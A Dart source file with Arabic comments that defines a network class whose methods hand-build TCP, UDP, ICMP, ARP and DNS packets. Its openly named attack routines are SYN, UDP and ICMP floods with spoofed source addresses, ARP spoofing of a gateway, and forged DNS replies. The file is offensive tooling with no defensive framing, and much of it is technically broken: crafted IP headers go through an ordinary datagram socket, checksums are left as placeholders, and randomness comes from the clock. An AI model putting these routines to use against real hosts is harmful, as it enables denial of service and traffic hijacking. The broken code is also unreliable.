import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';

class UltimateRawNetworkSystem {
  RawDatagramSocket? _rawSocket;
  bool _isListening = false;

  /// فتح مقبس خام (RAW Socket)
  Future<bool> openRawSocket({String? interface}) async {
    try {
      _rawSocket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
      _isListening = true;
      return true;
    } catch (_) {
      return false;
    }
  }

  /// إرسال حزمة خام
  Future<bool> sendRawPacket(Uint8List packet, String destination, int port) async {
    if (_rawSocket == null) return false;
    try {
      _rawSocket!.send(packet, InternetAddress(destination), port);
      return true;
    } catch (_) {
      return false;
    }
  }

  /// بناء حزمة TCP مخصصة
  Uint8List craftTcpPacket({
    required String srcIp,
    required String dstIp,
    required int srcPort,
    required int dstPort,
    int seq = 0,
    int ack = 0,
    int flags = 0x02,
    String payload = '',
  }) {
    final buffer = BytesBuilder();
    final srcIpBytes = srcIp.split('.').map(int.parse).toList();
    final dstIpBytes = dstIp.split('.').map(int.parse).toList();
    final payloadBytes = utf8.encode(payload);

    // IP Header
    buffer.addByte(0x45); // Version + IHL
    buffer.addByte(0x00); // DSCP + ECN
    final totalLength = 20 + 20 + payloadBytes.length;
    buffer.add([(totalLength >> 8) & 0xFF, totalLength & 0xFF]); // Total Length
    buffer.add([0x00, 0x01]); // Identification
    buffer.add([0x40, 0x00]); // Flags + Fragment
    buffer.addByte(0x40); // TTL
    buffer.addByte(0x06); // Protocol (TCP)
    buffer.add([0x00, 0x00]); // Header Checksum (placeholder)
    buffer.add(srcIpBytes);
    buffer.add(dstIpBytes);

    // TCP Header
    buffer.add([(srcPort >> 8) & 0xFF, srcPort & 0xFF]);
    buffer.add([(dstPort >> 8) & 0xFF, dstPort & 0xFF]);
    buffer.add([(seq >> 24) & 0xFF, (seq >> 16) & 0xFF, (seq >> 8) & 0xFF, seq & 0xFF]);
    buffer.add([(ack >> 24) & 0xFF, (ack >> 16) & 0xFF, (ack >> 8) & 0xFF, ack & 0xFF]);
    buffer.addByte(0x50); // Data Offset
    buffer.addByte(flags);
    buffer.add([0xFF, 0xFF]); // Window Size
    buffer.add([0x00, 0x00]); // Checksum (placeholder)
    buffer.add([0x00, 0x00]); // Urgent Pointer

    if (payloadBytes.isNotEmpty) buffer.add(payloadBytes);

    return buffer.toBytes();
  }

  /// بناء حزمة UDP مخصصة
  Uint8List craftUdpPacket({
    required String srcIp,
    required String dstIp,
    required int srcPort,
    required int dstPort,
    String payload = '',
  }) {
    final buffer = BytesBuilder();
    final srcIpBytes = srcIp.split('.').map(int.parse).toList();
    final dstIpBytes = dstIp.split('.').map(int.parse).toList();
    final payloadBytes = utf8.encode(payload);

    buffer.addByte(0x45);
    buffer.addByte(0x00);
    final totalLength = 20 + 8 + payloadBytes.length;
    buffer.add([(totalLength >> 8) & 0xFF, totalLength & 0xFF]);
    buffer.add([0x00, 0x01]);
    buffer.add([0x00, 0x00]);
    buffer.addByte(0x40);
    buffer.addByte(0x11);
    buffer.add([0x00, 0x00]);
    buffer.add(srcIpBytes);
    buffer.add(dstIpBytes);

    buffer.add([(srcPort >> 8) & 0xFF, srcPort & 0xFF]);
    buffer.add([(dstPort >> 8) & 0xFF, dstPort & 0xFF]);
    final udpLength = 8 + payloadBytes.length;
    buffer.add([(udpLength >> 8) & 0xFF, udpLength & 0xFF]);
    buffer.add([0x00, 0x00]);

    if (payloadBytes.isNotEmpty) buffer.add(payloadBytes);

    return buffer.toBytes();
  }

  /// بناء حزمة ICMP مخصصة
  Uint8List craftIcmpPacket({
    required String srcIp,
    required String dstIp,
    int type = 8,
    int code = 0,
    String payload = '',
  }) {
    final buffer = BytesBuilder();
    final srcIpBytes = srcIp.split('.').map(int.parse).toList();
    final dstIpBytes = dstIp.split('.').map(int.parse).toList();
    final payloadBytes = utf8.encode(payload);

    buffer.addByte(0x45);
    buffer.addByte(0x00);
    final totalLength = 20 + 8 + payloadBytes.length;
    buffer.add([(totalLength >> 8) & 0xFF, totalLength & 0xFF]);
    buffer.add([0x00, 0x01]);
    buffer.add([0x00, 0x00]);
    buffer.addByte(0x40);
    buffer.addByte(0x01); // ICMP
    buffer.add([0x00, 0x00]);
    buffer.add(srcIpBytes);
    buffer.add(dstIpBytes);

    buffer.addByte(type);
    buffer.addByte(code);
    buffer.add([0x00, 0x00]); // Checksum (placeholder)
    buffer.add([0x00, 0x01]); // Identifier
    buffer.add([0x00, 0x01]); // Sequence Number

    if (payloadBytes.isNotEmpty) buffer.add(payloadBytes);

    return buffer.toBytes();
  }

  /// حقن حزمة في الشبكة (ARP Spoofing)
  Uint8List craftArpPacket({
    required String senderMac,
    required String targetMac,
    required String senderIp,
    required String targetIp,
    int operation = 2, // 1 = Request, 2 = Reply
  }) {
    final buffer = BytesBuilder();
    final senderMacBytes = senderMac.split(':').map((h) => int.parse(h, radix: 16)).toList();
    final targetMacBytes = targetMac.split(':').map((h) => int.parse(h, radix: 16)).toList();
    final senderIpBytes = senderIp.split('.').map(int.parse).toList();
    final targetIpBytes = targetIp.split('.').map(int.parse).toList();

    // Ethernet Header (simplified)
    buffer.add(targetMacBytes);
    buffer.add(senderMacBytes);
    buffer.add([0x08, 0x06]); // EtherType: ARP

    // ARP Header
    buffer.add([0x00, 0x01]); // Hardware Type: Ethernet
    buffer.add([0x08, 0x00]); // Protocol Type: IPv4
    buffer.addByte(0x06); // Hardware Address Length
    buffer.addByte(0x04); // Protocol Address Length
    buffer.add([(operation >> 8) & 0xFF, operation & 0xFF]);
    buffer.add(senderMacBytes);
    buffer.add(senderIpBytes);
    buffer.add(targetMacBytes);
    buffer.add(targetIpBytes);

    return buffer.toBytes();
  }

  /// SYN Flood Attack
  Future<int> synFlood(String target, int port, {int packets = 1000}) async {
    int sent = 0;
    for (int i = 0; i < packets; i++) {
      final packet = craftTcpPacket(
        srcIp: '${_randomOctet()}.${_randomOctet()}.${_randomOctet()}.${_randomOctet()}',
        dstIp: target,
        srcPort: _randomPort(),
        dstPort: port,
        flags: 0x02, // SYN
      );
      await sendRawPacket(packet, target, port);
      sent++;
    }
    return sent;
  }

  /// UDP Flood Attack
  Future<int> udpFlood(String target, int port, {int packets = 1000}) async {
    int sent = 0;
    for (int i = 0; i < packets; i++) {
      final packet = craftUdpPacket(
        srcIp: '${_randomOctet()}.${_randomOctet()}.${_randomOctet()}.${_randomOctet()}',
        dstIp: target,
        srcPort: _randomPort(),
        dstPort: port,
        payload: 'A' * 64,
      );
      await sendRawPacket(packet, target, port);
      sent++;
    }
    return sent;
  }

  /// ICMP Flood (Ping of Death)
  Future<int> icmpFlood(String target, {int packets = 500}) async {
    int sent = 0;
    for (int i = 0; i < packets; i++) {
      final packet = craftIcmpPacket(
        srcIp: '${_randomOctet()}.${_randomOctet()}.${_randomOctet()}.${_randomOctet()}',
        dstIp: target,
        type: 8,
        code: 0,
        payload: 'X' * 1472,
      );
      await sendRawPacket(packet, target, 0);
      sent++;
    }
    return sent;
  }

  /// ARP Spoofing Attack
  Future<bool> arpSpoof(String targetIp, String targetMac, String gatewayIp, String gatewayMac) async {
    final packet = craftArpPacket(
      senderMac: gatewayMac,
      targetMac: targetMac,
      senderIp: gatewayIp,
      targetIp: targetIp,
      operation: 2,
    );
    return await sendRawPacket(packet, targetIp, 0);
  }

  /// DNS Spoofing
  Future<bool> dnsSpoof(String targetIp, String domain, String fakeIp) async {
    // بناء رد DNS مزيف
    final buffer = BytesBuilder();
    // DNS Header
    buffer.add([0x00, 0x01]); // Transaction ID
    buffer.add([0x81, 0x80]); // Flags: Standard Response
    buffer.add([0x00, 0x01]); // Questions
    buffer.add([0x00, 0x01]); // Answers
    buffer.add([0x00, 0x00]); // Authority
    buffer.add([0x00, 0x00]); // Additional

    // Question
    for (final part in domain.split('.')) {
      buffer.addByte(part.length);
      buffer.add(utf8.encode(part));
    }
    buffer.addByte(0x00);
    buffer.add([0x00, 0x01]); // Type A
    buffer.add([0x00, 0x01]); // Class IN

    // Answer
    buffer.add([0xC0, 0x0C]); // Pointer
    buffer.add([0x00, 0x01]); // Type A
    buffer.add([0x00, 0x01]); // Class IN
    buffer.add([0x00, 0x00, 0x00, 0x3C]); // TTL
    buffer.add([0x00, 0x04]); // Data Length
    buffer.add(fakeIp.split('.').map(int.parse).toList());

    return await sendRawPacket(buffer.toBytes(), targetIp, 53);
  }

  /// إغلاق المقبس
  void close() {
    _rawSocket?.close();
    _isListening = false;
  }

  int _randomOctet() => DateTime.now().microsecondsSinceEpoch % 254 + 1;
  int _randomPort() => DateTime.now().microsecondsSinceEpoch % 60000 + 1025;
}
